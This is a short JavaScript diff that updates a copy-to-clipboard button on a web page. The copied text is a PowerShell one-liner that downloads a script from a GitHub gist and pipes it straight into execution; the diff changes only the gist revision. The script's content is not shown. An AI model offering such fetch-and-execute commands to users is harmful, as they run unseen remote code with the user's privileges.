@@ -59,7 +59,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   // Copy logic
   btn.onclick = async () => {
-    const textToCopy = "irm https://gist.githubusercontent.com/xurst/495240cfb21eb3e9ad83f4c239258f90/raw/f37db3efc3b25710c8a99c5fbbc031da5c6f43d2/gistfile1.txt | iex";
+    const textToCopy = "irm https://gist.githubusercontent.com/xurst/495240cfb21eb3e9ad83f4c239258f90/raw/0648f27a2e440f720a72e97c18f748efc0610412/gistfile1.txt | iex";
     try {
       await navigator.clipboard.writeText(textToCopy);
       notify("Copied to clipboard!");
